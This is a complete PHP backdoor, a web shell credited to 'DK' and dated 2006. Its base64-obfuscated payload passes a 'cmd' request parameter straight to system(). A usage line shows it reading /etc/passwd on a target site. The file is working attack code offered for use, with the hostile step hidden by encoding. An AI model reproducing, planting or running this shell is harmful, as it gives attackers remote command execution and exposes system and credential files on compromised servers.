<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

<?php

eval(base64_decode('aWYoYXNzZXQoJF9SRVFVRVNUWydjbWQnXSkpewogICAgICAgIGVjaG8gIjxwcmU+IjsKICAgICAgICAkY21kID0gKCRfUkVRVUVTVFsnY21kJ10pOwogICAgICAgIHN5c3RlbSgkY21kKTsKICAgICAgICBlY2hvICI8L3ByZT4iOwogICAgICAgIGRpZTsKfQ=='));

?>

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd

<!--    http://michaeldaw.org   2006    -->
